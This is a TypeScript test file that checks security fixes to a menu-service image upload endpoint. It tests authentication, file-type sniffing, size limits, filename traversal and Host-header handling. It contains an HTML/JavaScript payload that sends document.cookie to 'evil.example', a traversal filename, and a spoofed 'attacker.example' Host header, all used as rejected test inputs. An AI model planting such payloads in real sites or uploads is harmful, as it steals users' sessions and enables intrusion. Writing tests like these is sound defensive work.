/**
 * BLACK-BOX functional tests - menu-service POST /api/upload (SE4030).
 * POST-FIX verification suite: uploads now require auth (VULN-01/02), the
 * file filter checks extension + MIME + magic bytes (VULN-06), and the
 * returned URL is built from PUBLIC_BASE_URL, not the Host header (VULN-10).
 */
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import app from '../../src/app';
import { connectAndReset, disconnectDb } from '../helpers/db';
import { validUserToken } from '../helpers/tokens';

const api = request(app);
const AUTH = { Authorization: 'Bearer ' + validUserToken('it-menu-user-1') };

const UPLOAD_DIR = path.join(process.cwd(), 'uploads');

const PNG_1x1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64'
);

const HTML_PAYLOAD = Buffer.from(
  '<html><body><script>document.location="http://evil.example/?c="+document.cookie</script>HACKED</body></html>'
);

beforeAll(async () => {
  await connectAndReset();
  if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
});

afterAll(async () => {
  await disconnectDb();
});

describe('BLACK-BOX /api/upload', () => {
  it('TC-BB-048 valid PNG upload (with auth) -> 201 with url', async () => {
    const res = await api.post('/api/upload').set(AUTH).attach('file', PNG_1x1, 'ok.png');
    expect(res.status).toBe(201);
    expect(res.body).toHaveProperty('url');
    expect(res.body.url).toMatch(/^http:\/\/.*\/uploads\//);
    if (res.body.filename) {
      const fp = path.join(UPLOAD_DIR, res.body.filename);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    }
  });

  it('TC-BB-049 disallowed extension (.html) -> reject (400)', async () => {
    const res = await api.post('/api/upload').set(AUTH).attach('file', HTML_PAYLOAD, 'evil.html');
    expect(res.status).toBe(400);
  });

  it('TC-BB-050 NO file -> 400', async () => {
    const res = await api.post('/api/upload').set(AUTH);
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('No file uploaded');
  });

  it('TC-BB-051 oversized file (>2MB) -> 400 (multer limit)', async () => {
    const big = Buffer.alloc(3 * 1024 * 1024, 1);
    const res = await api.post('/api/upload').set(AUTH).attach('file', big, 'big.png');
    expect(res.status).toBe(400);
  });

  it('TC-BB-052 HTML payload smuggled with image extension is REJECTED -> 400 (magic-byte sniff)', async () => {
    const res = await api.post('/api/upload').set(AUTH).attach('file', HTML_PAYLOAD, 'smuggled.png');
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('File content is not a valid image');
  });

  it('TC-BB-053 traversal-style client filename is neutralised (random server name used)', async () => {
    const res = await api.post('/api/upload').set(AUTH).attach('file', PNG_1x1, '../../../../../evil.png');
    expect(res.status).toBe(201);
    expect(res.body.filename).not.toContain('..');
    const fp = path.join(UPLOAD_DIR, res.body.filename);
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  });

  it('TC-BB-054 Host header is NOT reflected into the URL (VULN-10 fixed: PUBLIC_BASE_URL used)', async () => {
    const res = await api
      .post('/api/upload')
      .set(AUTH)
      .set('Host', 'attacker.example')
      .attach('file', PNG_1x1, 'ok.png');
    expect(res.status).toBe(201);
    expect(res.body.url).not.toMatch(/^http:\/\/attacker\.example\//);
    expect(res.body.url).toMatch(/^http:\/\/localhost:3001\/uploads\//);
    if (res.body.filename) {
      const fp = path.join(UPLOAD_DIR, res.body.filename);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    }
  });
});